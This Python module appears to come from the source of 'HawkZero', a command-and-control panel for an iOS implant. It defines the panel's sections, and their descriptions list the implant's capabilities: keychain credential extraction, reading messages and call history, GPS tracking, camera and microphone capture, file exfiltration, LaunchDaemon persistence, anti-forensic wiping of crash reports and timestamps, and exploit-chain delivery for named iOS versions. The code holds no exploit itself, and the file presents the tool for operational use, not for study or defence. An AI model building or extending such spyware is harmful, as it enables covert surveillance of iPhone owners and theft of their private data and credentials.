"""HawkZero admin sections — mapped to this project's iOS C2 surface.

Each section maps to one HUD banner image in static/img/buttons and a colour
theme used by the .hz-btn controls inside that section. Slugs correspond to real
capabilities of the agent/implant and the exploit delivery chain.
"""

SECTIONS = [
    {"slug": "dashboard", "label": "Dashboard", "image": "hawk.png", "theme": "cyan",
     "blurb": "Command overview and live fleet status."},

    {"slug": "devices", "label": "Devices", "image": "targets.png", "theme": "cyan",
     "blurb": "Connected iPhones: identity, build and kernel R/W state."},

    {"slug": "screen", "label": "iPhone Shell", "image": "mobile-security.png", "theme": "cyan",
     "blurb": "Live screen stream and remote control."},

    {"slug": "location", "label": "Location", "image": "network.png", "theme": "cyan",
     "blurb": "GPS fixes and tracking history."},

    {"slug": "keychain", "label": "Keychain", "image": "security.png", "theme": "violet",
     "blurb": "Credential and keychain extraction."},

    {"slug": "messages", "label": "Messages", "image": "analytics.png", "theme": "gold",
     "blurb": "SMS, iMessage and call history."},

    {"slug": "contacts", "label": "Contacts", "image": "signals.png", "theme": "cyan",
     "blurb": "Address book extraction."},

    {"slug": "safari", "label": "Safari", "image": "web.png", "theme": "cyan",
     "blurb": "Browsing history and cookies."},

    {"slug": "files", "label": "Files", "image": "files.png", "theme": "violet",
     "blurb": "Filesystem browse and exfiltration."},

    {"slug": "console", "label": "Console", "image": "console.png", "theme": "cyan",
     "blurb": "Task dispatch and raw output."},

    {"slug": "media", "label": "Camera & Mic", "image": "scans.png", "theme": "cyan",
     "blurb": "Photo capture and audio recording."},

    {"slug": "persistence", "label": "Persistence", "image": "system.png", "theme": "gold",
     "blurb": "Trust cache and LaunchDaemon implant."},

    {"slug": "antiforensics", "label": "Anti-Forensics", "image": "alerts.png", "theme": "violet",
     "blurb": "Crash-report wipe and timestamp control."},

    {"slug": "delivery", "label": "Delivery", "image": "recon.png", "theme": "gold",
     "blurb": "Exploit chain delivery for iOS 18.4 - 26.6."},

    {"slug": "api-keys", "label": "API & Keys", "image": "api-keys.png", "theme": "violet",
     "blurb": "Agent tokens and session control."},
]

BY_SLUG = {s["slug"]: s for s in SECTIONS}
